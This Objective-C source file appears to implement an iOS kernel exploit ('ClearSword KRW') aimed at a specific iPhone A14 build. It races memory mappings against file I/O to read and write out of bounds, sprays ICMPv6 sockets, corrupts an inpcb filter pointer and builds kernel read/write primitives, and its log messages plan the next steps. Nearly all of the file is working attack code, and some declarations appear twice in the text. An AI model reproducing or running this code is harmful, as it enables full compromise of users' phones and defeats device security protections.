// LuminaClearSword.m
// Lumina P007OpenOnly - ClearSword KRW UI V23

#import "LuminaClearSword.h"
#import "common.h"
#import "lumina_offsets.h"
#import "A14_23F77_LabOffsets.h"

#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <unistd.h>
#include <dispatch/dispatch.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <mach-o/dyld.h>

extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_make_memory_entry_64(vm_map_t, memory_object_size_t *, memory_object_offset_t, vm_prot_t, mem_entry_name_port_t *, mem_entry_name_port_t);

typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern kern_return_t IOSurfacePrefetchPages(IOSurfaceRef surface);

typedef mach_port_t lumina_fileport_t;
extern int fileport_makeport(int fd, lumina_fileport_t *port);
extern int fileport_makefd(lumina_fileport_t port);

#define PROC_INFO_CALL_PIDFILEPORTINFO 0x6
#define PROC_PIDFILEPORTSOCKETINFO 0x3
extern int __proc_info(int callnum, int pid, int flavor, uint64_t arg, void *buffer, int buffer_size);

// NECP constants (from A14_23F77_LabOffsets.h)
#define NECP_SOL_SOCKET      A14_23F77_SOL_SOCKET
#define NECP_SO_NECP_ATTR   A14_23F77_SO_NECP_ATTRIBUTES
#define NECP_TLV_TYPE       A14_23F77_NECP_TLV_TYPE
#define NECP_STR_LEN        A14_23F77_NECP_STR_LEN

#define EARLY_KRW_LENGTH 0x20
#define MAX_SOCKETS_COUNT 0x5800
#define MAX_LOCKED_SURFACES 8
#define CS_TIME_BUDGET_SEC 240



static pe_context_t s_ctx;
static volatile int s_churn_go = 0;
static int g_log_fd = -1;

static void krw_log(const char *fmt, ...) {
    char buf[4096];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fprintf(stderr, "%s\n", buf);
    if (g_log_fd >= 0) {
        write(g_log_fd, buf, strlen(buf));
        write(g_log_fd, "\n", 1);
        fcntl(g_log_fd, F_FULLFSYNC);
    }
}

static void *s_reverse_memmem(const void *h, size_t hl, const void *n, size_t nl) {
    if (nl == 0) return (void *)h;
    if (hl < nl) return NULL;
    const char *hh = (const char *)h;
    const char *nn = (const char *)n;
    for (size_t i = hl - nl + 1; i-- > 0;) {
        if (memcmp(hh + i, nn, nl) == 0) return (void *)(hh + i);
    }
    return NULL;
}

static CFNumberRef s_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef s_create_surface_with_address(mach_vm_address_t addr, mach_vm_size_t sz) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAddress"), s_cfnum(addr));
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), s_cfnum(sz));
    IOSurfaceRef surf = IOSurfaceCreate(props);
    if (surf) IOSurfacePrefetchPages(surf);
    CFRelease(props);
    return surf;
}

static kern_return_t s_create_pc_mapping(mach_port_t *port_out, mach_vm_address_t *addr_out, mach_vm_size_t sz) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), s_cfnum(sz));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
    IOSurfaceRef surf = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (!surf) return KERN_FAILURE;
    mach_vm_address_t phys = (mach_vm_address_t)IOSurfaceGetBaseAddress(surf);
    mach_port_t mo = 0;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &sz, phys, VM_PROT_DEFAULT, &mo, 0);
    if (kr != KERN_SUCCESS) { CFRelease(surf); return kr; }
    mach_vm_address_t map = 0;
    kr = mach_vm_map(mach_task_self(), &map, sz, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, mo, 0, false,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    CFRelease(surf);
    if (kr != KERN_SUCCESS) { mach_port_deallocate(mach_task_self(), mo); return kr; }
    *port_out = mo;
    *addr_out = map;
    return KERN_SUCCESS;
}

static void s_surface_mlock(mach_vm_address_t addr, mach_vm_size_t size) {
    IOSurfaceRef surf = s_create_surface_with_address(addr, size);
    if (surf) {
        size_t idx = s_ctx.mlock_surfaces_count++;
        s_ctx.mlock_surfaces[idx].address = addr;
        s_ctx.mlock_surfaces[idx].surface = surf;
    }
}

static void *s_free_thread_worker(void *arg) {
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    while (atomic_load_explicit(&s_ctx.shared->free_thread_start, memory_order_seq_cst) == 0);
    mach_vm_address_t free_target = atomic_load_explicit(&s_ctx.shared->free_target_sync, memory_order_seq_cst);
    mach_vm_size_t free_target_size = atomic_load_explicit(&s_ctx.shared->free_target_size_sync, memory_order_seq_cst);
    while (atomic_load_explicit(&s_ctx.shared->go_sync, memory_order_seq_cst) == 0);
    while (atomic_load_explicit(&s_ctx.shared->go_sync, memory_order_seq_cst) != 0) {
        while (atomic_load_explicit(&s_ctx.shared->race_sync, memory_order_seq_cst) == 0);
        mach_port_t target_obj = (mach_port_t)atomic_load_explicit(&s_ctx.shared->target_object_sync, memory_order_seq_cst);
        mach_vm_offset_t target_off = atomic_load_explicit(&s_ctx.shared->target_object_offset_sync, memory_order_seq_cst);
        mach_vm_address_t target_addr = free_target;
        mach_vm_map(mach_task_self(), &target_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_obj, target_off, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        atomic_store_explicit(&s_ctx.shared->race_sync, 0, memory_order_seq_cst);
    }
    return NULL;
}

static void *s_churn_thread(void *arg) {
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    while (s_churn_go) {
        int fds[512];
        for (int i = 0; i < 512; i++) fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        for (int i = 0; i < 512; i++) if (fds[i] >= 0) close(fds[i]);
        usleep(50);
    }
    return NULL;
}

// V39 FIX: Set NECP attributes on socket before fileport_makeport
static void s_set_necp_attributes(int fd) {
    // Build NECP TLV: type=0x07, length=NECP_STR_LEN, value=executable_name
    int name_len = (int)strlen(s_ctx.executable_name);
    if (name_len > NECP_STR_LEN) name_len = NECP_STR_LEN;
    
    int buf_len = 2 + NECP_STR_LEN;  // type(1) + length(1) + value(NECP_STR_LEN)
    uint8_t buf[2 + 256];
    memset(buf, 0, sizeof(buf));
    buf[0] = (uint8_t)NECP_TLV_TYPE;   // 0x07
    buf[1] = (uint8_t)NECP_STR_LEN;    // 255
    memcpy(buf + 2, s_ctx.executable_name, name_len);
    
    setsockopt(fd, NECP_SOL_SOCKET, NECP_SO_NECP_ATTR, buf, (socklen_t)buf_len);
}

static uint64_t s_spray_socket(void) {
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) return UINT64_MAX;
    
    // V39 FIX: Set NECP attributes so executable name is stored in inpcb+0x178
    s_set_necp_attributes(fd);
    
    mach_port_t port = MACH_PORT_NULL;
    fileport_makeport(fd, &port);
    close(fd);
    uint8_t *info = calloc(1, 0x400);
    __proc_info(PROC_INFO_CALL_PIDFILEPORTINFO, getpid(), PROC_PIDFILEPORTSOCKETINFO, port, info, 0x400);
    uint64_t gencnt = 0;
    memcpy(&gencnt, info + LUMINA_PROCINFO_GENCNT_OFF, sizeof(gencnt));
    size_t idx = s_ctx.socket_ports_count++;
    s_ctx.socket_ports[idx] = port;
    s_ctx.socket_pcb_ids[idx] = gencnt;
    free(info);
    return port;
}

static kern_return_t s_physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_off, uint64_t size, uint64_t off, uint8_t *buf) {
    atomic_store_explicit(&s_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&s_ctx.shared->target_object_offset_sync, mo_off, memory_order_seq_cst);
    s_ctx.iov.iov_base = (void *)(s_ctx.pc_address + 0x3f00);
    s_ctx.iov.iov_len = off + size;
    memcpy(buf, &s_ctx.random_marker, sizeof(uint64_t));
    memcpy((void *)(s_ctx.pc_address + 0x3f00 + off), &s_ctx.random_marker, sizeof(uint64_t));
    for (int try = 0; try < 20; try++) {
        if (cs_expired()) return KERN_FAILURE;
        atomic_store_explicit(&s_ctx.shared->race_sync, 1, memory_order_seq_cst);
        pwritev(s_ctx.read_fd, &s_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&s_ctx.shared->race_sync, memory_order_seq_cst) == 1);
        mach_vm_address_t map_addr = s_ctx.pc_address;
        mach_vm_map(mach_task_self(), &map_addr, s_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, s_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        pread(s_ctx.read_fd, buf, size, 0x3f00 + off);
        // V39 FIX: Scan full 0xf00 bytes (was only 0x100)
        for (int i = 0; i < (int)size; i += 8) {
            uint64_t val = *(uint64_t *)(buf + i);
            if (val != s_ctx.random_marker) {
                s_ctx.success_read_count++;
                return KERN_SUCCESS;
            }
        }
        usleep(1);
    }
    atomic_store_explicit(&s_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
    return KERN_FAILURE;
}

static void s_physical_oob_read_mo_with_retry(mach_port_t mo, mach_vm_offset_t mo_off, uint64_t size, uint64_t off, uint8_t *buf) {
    while (!cs_expired()) {
        if (s_physical_oob_read_mo(mo, mo_off, size, off, buf) == KERN_SUCCESS) break;
    }
}

static void s_physical_oob_write_mo(mach_port_t mo, mach_vm_offset_t mo_off, uint64_t size, uint64_t off, uint8_t *buf) {
    atomic_store_explicit(&s_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&s_ctx.shared->target_object_offset_sync, mo_off, memory_order_seq_cst);
    s_ctx.iov.iov_base = (void *)(s_ctx.pc_address + 0x3f00);
    s_ctx.iov.iov_len = off + size;
    pwrite(s_ctx.write_fd, buf, size, 0x3f00 + off);
    for (int try = 0; try < 20; try++) {
        if (cs_expired()) break;
        atomic_store_explicit(&s_ctx.shared->race_sync, 1, memory_order_seq_cst);
        preadv(s_ctx.write_fd, &s_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&s_ctx.shared->race_sync, memory_order_seq_cst) == 1);
        mach_vm_address_t map_addr = s_ctx.pc_address;
        mach_vm_map(mach_task_self(), &map_addr, s_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, s_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        usleep(1);
    }
    atomic_store_explicit(&s_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
}

static kern_return_t s_find_and_corrupt_socket(mach_port_t mo, mach_vm_offset_t mo_off, uint8_t *read_buf, uint8_t *write_buf, uint64_t *target_gencnts, size_t *gencnt_count, bool do_read) {
    if (do_read) {
        s_physical_oob_read_mo_with_retry(mo, mo_off, s_ctx.oob_size, s_ctx.oob_offset, read_buf);
    }
    uint64_t search_start = 0;
    bool target_found = false;
    uint64_t pcb_start_off = 0;
    uint64_t corrupted_marker = 0x0000ffffffffffff;
    void *found = NULL;
    do {
        found = memmem(read_buf + search_start, s_ctx.oob_size - search_start, s_ctx.executable_name, strlen(s_ctx.executable_name));
        if (found) {
            uint64_t found_off = (uint8_t *)found - read_buf;
            void *filter_found = s_reverse_memmem(found, found_off, &corrupted_marker, sizeof(corrupted_marker));
            if (filter_found) {
                uint64_t filter_off = (uint8_t *)filter_found - read_buf;
                if (filter_off >= s_ctx.offsets.inpcb_icmp6filt + 0x8) {
                    pcb_start_off = filter_off - (s_ctx.offsets.inpcb_icmp6filt + 0x8);
                    target_found = true;
                    break;
                }
            }
        }
        search_start += 0x400;
    } while (found && search_start < s_ctx.oob_size);

    if (!target_found) {
        // V39 FIX: Dump first 64 bytes of OOB data so we can see what we're reading
        static int dump_count = 0;
        if (dump_count < 5) {
            krw_log("[*] OOB data dump (first 64 bytes):");
            for (int i = 0; i < 64; i += 16) {
                krw_log("  %04x: %016llx %016llx %016llx %016llx",
                        i,
                        *(uint64_t *)(read_buf + i),
                        *(uint64_t *)(read_buf + i + 8),
                        *(uint64_t *)(read_buf + i + 16),
                        *(uint64_t *)(read_buf + i + 24));
            }
            dump_count++;
        }
        return KERN_FAILURE;
    }

    krw_log("[+] PCB found at offset 0x%llx", pcb_start_off);
    uint64_t target_gencnt = 0;
    memcpy(&target_gencnt, read_buf + pcb_start_off + LUMINA_INPCB_GENCNT, sizeof(target_gencnt));
    krw_log("[*] target gencnt: 0x%llx", target_gencnt);

    if (target_gencnt == s_ctx.socket_pcb_ids[s_ctx.socket_ports_count - 1]) {
        krw_log("[-] found last PCB");
        return KERN_FAILURE;
    }

    bool is_our_pcb = false;
    size_t control_idx = 0;
    for (size_t i = 0; i < s_ctx.socket_ports_count; i++) {
        if (s_ctx.socket_pcb_ids[i] == target_gencnt) {
            is_our_pcb = true;
            control_idx = i;
            break;
        }
    }
    if (!is_our_pcb) {
        krw_log("[-] found freed PCB page");
        return KERN_FAILURE;
    }

    for (size_t i = 0; i < *gencnt_count; i++) {
        if (target_gencnts[i] == target_gencnt) {
            krw_log("[-] found old PCB page");
            return KERN_FAILURE;
        }
    }
    target_gencnts[(*gencnt_count)++] = target_gencnt;

    uint64_t inp_list_next_ptr = *(uint64_t *)(read_buf + pcb_start_off + LUMINA_INPCB_LIST_PREV) - LUMINA_INPCB_LIST_NEXT;
    uint64_t icmp6filter = *(uint64_t *)(read_buf + pcb_start_off + s_ctx.offsets.inpcb_icmp6filt);
    krw_log("[*] inp_list_next_ptr: 0x%llx", inp_list_next_ptr);
    krw_log("[*] icmp6filter: 0x%llx", icmp6filter);

    s_ctx.rw_socket_pcb = inp_list_next_ptr;

    memcpy(write_buf, read_buf, s_ctx.oob_size);
    *(uint64_t *)(write_buf + pcb_start_off + s_ctx.offsets.inpcb_icmp6filt) = inp_list_next_ptr + s_ctx.offsets.inpcb_icmp6filt;
    *(uint64_t *)(write_buf + pcb_start_off + s_ctx.offsets.inpcb_icmp6filt + 8) = 0;

    krw_log("[*] corrupting icmp6filter pointer...");
    int corrupt_tries = 0;
    while (true) {
        if (cs_expired() || ++corrupt_tries > 4000) {
            krw_log("[-] corrupt loop bailing (tries=%d)", corrupt_tries);
            return KERN_FAILURE;
        }
        s_physical_oob_write_mo(mo, mo_off, s_ctx.oob_size, s_ctx.oob_offset, write_buf);
        s_physical_oob_read_mo_with_retry(mo, mo_off, s_ctx.oob_size, s_ctx.oob_offset, read_buf);
        uint64_t new_icmp6filter = 0;
        memcpy(&new_icmp6filter, read_buf + pcb_start_off + s_ctx.offsets.inpcb_icmp6filt, sizeof(new_icmp6filter));
        if (new_icmp6filter == inp_list_next_ptr + s_ctx.offsets.inpcb_icmp6filt) {
            krw_log("[+] target corrupted: 0x%llx", new_icmp6filter);
            break;
        }
    }

    int sock = fileport_makefd(s_ctx.socket_ports[control_idx]);
    socklen_t read_len = EARLY_KRW_LENGTH;
    memset(s_ctx.getsockopt_read_data, 0, EARLY_KRW_LENGTH);
    int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, s_ctx.getsockopt_read_data, &read_len);
    if (res != 0) {
        krw_log("[-] getsockopt(control) failed: %s", strerror(errno));
        return KERN_FAILURE;
    }

    uint64_t marker = 0;
    memcpy(&marker, s_ctx.getsockopt_read_data, sizeof(marker));
    if (marker != 0xffffffffffffffff) {
        krw_log("[+] found control_socket at idx: %zu", control_idx);
        s_ctx.control_socket = sock;
        s_ctx.rw_socket = fileport_makefd(s_ctx.socket_ports[control_idx + 1]);
        return KERN_SUCCESS;
    }

    krw_log("[-] failed to corrupt control_socket at idx: %zu", control_idx);
    return KERN_FAILURE;
}

static bool s_set_target_kaddr(uint64_t where) {
    memset(s_ctx.control_data, 0, sizeof(s_ctx.control_data));
    memcpy(s_ctx.control_data, &where, sizeof(where));
    int res = setsockopt(s_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, s_ctx.control_data, sizeof(s_ctx.control_data));
    return res == 0;
}

static void s_early_kreadbuf(uint64_t where, void *readBuf, size_t size) {
    if (size > EARLY_KRW_LENGTH) return;
    uint64_t real_end = where + EARLY_KRW_LENGTH - 1;
    int64_t off = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) off = (EARLY_KRW_LENGTH - size);
    if (!s_set_target_kaddr(where - off)) return;
    uint8_t tmp[EARLY_KRW_LENGTH];
    socklen_t read_len = EARLY_KRW_LENGTH;
    int res = getsockopt(s_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmp, &read_len);
    if (res != 0) return;
    memcpy(readBuf, &tmp[off], size);
}

static uint64_t s_early_kread64(uint64_t where) {
    uint64_t val = 0;
    s_early_kreadbuf(where, &val, sizeof(val));
    return val;
}

static void s_early_kwritebuf(uint64_t where, void *writeBuf, size_t size) {
    if (size > EARLY_KRW_LENGTH) return;
    uint64_t real_end = where + EARLY_KRW_LENGTH - 1;
    int64_t off = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) off = (EARLY_KRW_LENGTH - size);
    uint8_t tmp[EARLY_KRW_LENGTH];
    s_early_kreadbuf(where - off, tmp, EARLY_KRW_LENGTH);
    memcpy(&tmp[off], writeBuf, size);
    if (!s_set_target_kaddr(where - off)) return;
    int res = setsockopt(s_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmp, EARLY_KRW_LENGTH);
}

static void s_early_kwrite64(uint64_t where, uint64_t what) {
    s_early_kwritebuf(where, &what, sizeof(what));
}

extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_make_memory_entry_64(vm_map_t, memory_object_size_t *, memory_object_offset_t, vm_prot_t, mem_entry_name_port_t *, mem_entry_name_port_t);

typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern kern_return_t IOSurfacePrefetchPages(IOSurfaceRef surface);

typedef mach_port_t lumina_fileport_t;
extern int fileport_makeport(int fd, lumina_fileport_t *port);
extern int fileport_makefd(lumina_fileport_t port);

#define PROC_INFO_CALL_PIDFILEPORTINFO 0x6
#define PROC_PIDFILEPORTSOCKETINFO 0x3
extern int __proc_info(int callnum, int pid, int flavor, uint64_t arg, void *buffer, int buffer_size);

// NECP constants (from A14_23F77_LabOffsets.h)
#define NECP_SOL_SOCKET      A14_23F77_SOL_SOCKET
#define NECP_SO_NECP_ATTR   A14_23F77_SO_NECP_ATTRIBUTES
#define NECP_TLV_TYPE       A14_23F77_NECP_TLV_TYPE
#define NECP_STR_LEN        A14_23F77_NECP_STR_LEN

#define EARLY_KRW_LENGTH 0x20
#define MAX_SOCKETS_COUNT 0x5800
#define MAX_LOCKED_SURFACES 8
#define CS_TIME_BUDGET_SEC 240

int clearsword_kreadbuf(uint64_t kaddr, void* output, size_t size);
// Global variables for logging
int g_cs_log_fd = -1;
NSMutableString *g_cs_log_str = nil;
NSLock *g_cs_log_lock = nil;

volatile int g_cs_stop = 0;
volatile time_t g_cs_deadline = 0;



void cs_log_line(const char *fmt, ...) {
    char buf[4096];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    fprintf(stderr, "%s\n", buf);
    fflush(stderr);

    if (g_cs_log_fd >= 0) {
        size_t n = strlen(buf);
        write(g_cs_log_fd, buf, n);
        write(g_cs_log_fd, "\n", 1);
        fcntl(g_cs_log_fd, F_FULLFSYNC);
    }
    if (g_cs_log_str && g_cs_log_lock) {
        [g_cs_log_lock lock];
        if (g_cs_log_str.length < 512 * 1024) {
            [g_cs_log_str appendFormat:@"%s\n", buf];
        }
        [g_cs_log_lock unlock];
    }
    usleep(1000);
}

@implementation LuminaClearSword

+ (NSString *)runKRW {
    g_cs_log_str = [NSMutableString string];
    g_cs_log_lock = [NSLock new];

    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"clearsword_krw_log.txt"];
    g_cs_log_fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    cs_log_line("time %s", [[[NSDate date] description] UTF8String]);
    cs_log_line("=== ClearSword KRW V23 — Pointer Fix (A14 23F77) ===");
    cs_log_line("logfile: %s", [lp UTF8String]);
    cs_log_line("time budget: %d s. Panic = reboot, reopen app, recovered log shows last step.", CS_TIME_BUDGET_SEC);
    cs_log_line("target: iPhone13,2 A14 iOS 26.5 / 23F77  static_base=0x%llx",
                (unsigned long long)LUMINA_STATIC_BASE);
    cs_log_line("UI: cskrw. Not P044. Look for icmp6filter: / target corrupted.");
    cs_log_line("RE pack 54: hop1 cluster_write/read_contig on 23F77 returns EINVAL unless second UPL has UPL_PHYS_CONTIG. Apple listed CS fixed iOS 26.1. oob-reads=0 is the expected hop1 miss, not a missing offset.");

    // FIX: Reduced time budget for faster feedback
    g_cs_stop = 0;
    g_cs_deadline = time(NULL) + CS_TIME_BUDGET_SEC;

    // Run on background thread with progress updates
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        usleep(100000); // Let UI update
        
        // FIX: Add progress indicator
        cs_log_line("=== Starting ClearSword KRW V23 ===");
        cs_log_line("This will take approximately 60-120 seconds...");
        
        int ret = clearsword_run();

        if (ret == 0 && g_ctx.kernel_base != 0 && !g_cs_stop) {
            cs_log_line("=== KRW ESTABLISHED ===");
            cs_log_line("kernel_base: 0x%llx", g_ctx.kernel_base);
            cs_log_line("kernel_slide: 0x%llx", g_ctx.kernel_slide);
            uint64_t magic = 0;
            clearsword_kreadbuf(g_ctx.kernel_base, &magic, sizeof(magic));
            cs_log_line("kread64(kernel_base) = 0x%llx %s", magic,
                        (magic == 0x100000cfeedfacfULL) ? "(MH magic OK)" : "(unexpected!)");
            cs_log_line("control_socket=%d rw_socket=%d (leaked/pinned; primitive stays live in-process)",
                        g_ctx.control_socket, g_ctx.rw_socket);
            cs_log_line("NEXT: paste log back. KRW is live for this process lifetime.");
        } else {
            cs_log_line("=== NO KRW THIS RUN === ret=%d stop=%d", ret, g_cs_stop);
            cs_log_line("base=0x%llx slide=0x%llx oob_reads=%llu",
                        g_ctx.kernel_base, g_ctx.kernel_slide, g_ctx.success_read_count);
            cs_log_line("If log shows repeated 'oob reads so far: 0' the race stopped hitting; "
                        "if reads landed but no PCB, offsets need re-verification.");
            cs_log_line("Consider pivoting to 64788 if ClearSword continues to fail.");
        }

        cs_log_line("DONE — paste this text back");
        if (g_cs_log_fd >= 0) { close(g_cs_log_fd); g_cs_log_fd = -1; }
    });

    return @"ClearSword KRW V23 started in background (120s timeout). Check the log file.";
}

@end
